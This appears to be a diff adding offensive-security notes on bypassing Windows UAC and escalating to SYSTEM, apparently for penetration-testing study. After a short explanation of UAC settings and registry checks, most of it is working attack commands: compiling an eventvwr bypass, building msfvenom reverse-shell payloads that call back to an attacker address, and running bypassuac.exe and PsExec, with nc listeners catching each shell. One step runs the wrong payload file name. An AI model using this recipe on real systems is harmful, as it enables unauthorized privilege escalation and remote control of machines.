@@ -1,0 +1,69 @@
+UAC Bypass:
+==========
+Scenario:
+	The shell belongs to the local Administrators group but UAC is enabled and needs to be bypassed, before we can elevate to SYSTEM.
+Basics:
+	Windows implements UAC by using two separate SIDs even for administrator accounts.
+	Running cmd.exe from the Start menu without select ‘Run as administrator’ will give a shell without admin privileges, For Example:
+		You cannot for example write to C:\Windows\System32 as it will give Access is denied error.
+	For tasks which require privilege elevation, the administrator SID is used after the prompt on Secure Desktop has been clicked away
+	Secure Desktop:
+		The Secure Desktop’s primary difference from the User Desktop is that only trusted processes running as SYSTEM are allowed to run here
+	UAC Settings:
+		1. Always Notify. This setting is the highest UAC setting. It will prompt the user when any program, including a built-in Windows program wants higher privileges.
+		2. Notify me only when programs try to make changes to my computer. This is the default UAC setting. This setting does not prompt the user when some built-in Windows program want higher privileges. It will prompt the user when any other program wants higher privileges. This distinction is important and it plays into the UAC bypass attack that we will cover in a moment.
+		3. Notify me only when programs try to make changes to my computer (do not dim my desktop). This is the same as the default setting, except the user’s desktop does not dim when the UAC elevation prompt comes up. This setting exists for computers that lack the computing power to dim the desktop and show a dialog on top of it.	
+		4. Never notify. This option takes us back to life before Windows Vista. On Windows 7, if a user is an administrator, all of their programs will run with high integrity. On Windows 8, programs run at the medium integrity level, but anything run by an Administrator that requests elevated rights gets them without a prompt.
+TO see if we have admin rights:
+	whoami /groups
+		it should have "Mandatory Label\High Mandatory Level" group
+To see if UAC is enabled:
+	reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+	Now, in its output, see these:
+		Value of 'EnableLUA' key:
+			0 => we dont need to bypass
+			1 => Then check these 2 keys:
+				ConsentPromptBehaviorAdmin:
+					Values => 0,2 or 5
+				PromptOnSecureDesktop:
+					Values => 0 or 1
+Automated Method:
+	metasploit => exploit/windows/local/bypassuac_eventvwr
+Manual Bypassing method-1:
+	Step-1 - Elevate cmd shell from Medium to High integrity:
+		Usage:
+			wget https://github.com/turbo/zero2hero/main.c
+			edit main.c:
+				change line "strcat(curPath, "\\foobar.exe");" to "strcat(curPath, "\\revshell.exe");"
+		 	x86_64-w64-mingw32-gcc main.c -o eventvwr-bypassuac-64.exe
+		 	msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=3333 -f exe -o revshell.exe
+		 	transfer both revshell.exe and eventvwr-bypassuac-64.exe to target\
+		 	c:/>eventvwr-bypassuac-64.exe
+		 	nc -nvlp 3333 => got shell 
+		Explanation:
+			We got a High intergrity shell, means we unlocked more privileges which may or may not be enabled
+			whoami /priv
+	Step-2 - Elevate from High integrity cmd shell to SYSTEM:
+		Usage:
+			msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=4444 -f exe -o revshell2.exe
+			transfer psexec.exe and revshell2.exe to target
+			C:\>PsExec64.exe -i -accepteula -d -s C:\temp\revshell2.exe
+			nc -nvlp 4444 => got shell 
+		Explanation:
+			we got system shell
+	Note:
+		 At ‘Always notify’, in which case ConsentPromptBehaviorAdmin = 2 and PromptOnSecureDesktop = 1, this method will not work
+Manual Bypassing method-2 using bypassuac.exe:
+	Step-1 - Elevate cmd shell from Medium to High integrity:	
+		In kali, we have:
+			bypassuac-x86.exe
+			bypassuac-x64.exe
+		transfer the exploit according to arch to the target
+		msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=1234 -f exe -o shell.exe
+		C:\>bypassuac-x64.exe /c C:\temp\shell.exe
+		nc -nvlp 1234 => got shell
+	Step-2 - Elevate from High integrity cmd shell to SYSTEM:
+		msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=2222 -f exe -o shell2.exe
+		transfer psexec.exe and shell2.exe on target
+		C:\>PsExec64.exe -i -accepteula -d -s C:\temp\shell.exe
+		nc -nvlp 2222 => got shell as system
